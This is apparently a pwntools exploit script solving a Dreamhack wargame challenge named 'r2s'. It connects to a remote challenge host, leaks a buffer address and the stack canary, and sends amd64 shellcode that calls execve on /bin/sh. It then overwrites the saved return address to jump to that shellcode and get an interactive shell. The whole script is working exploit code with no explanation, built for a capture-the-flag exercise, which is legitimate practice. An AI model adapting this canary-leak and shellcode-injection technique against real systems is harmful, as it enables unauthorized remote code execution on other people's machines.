from pwn import *

exe = ELF('./r2s', checksec=False)
# p = process(exe.path)
p = remote("host1.dreamhack.games", 18502)

input()

# Leak buf address
p.recvuntil(b'buf: ')
buf = p.recvuntil(b'\n').decode()
buf = int(buf, 16)
print("Buf address: " + hex(buf))

# Leak canary
payload = b'a'*0x58
p.sendlineafter(b'Input: ', payload)
p.recvuntil(b'\n')
canary = u64(b'\0' + p.recv(7))
print("Canary: " + hex(canary))

shellcode = asm(
    '''
    mov rbx, 29400045130965551
    push rbx

    mov rax, 0x3b
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    syscall
    ''', arch='amd64')
payload = shellcode + b'a'*(0x58 - len(shellcode)) + p64(canary) + b'a'*8 + p64(buf)
p.sendafter(b'Input: ', payload)

p.interactive()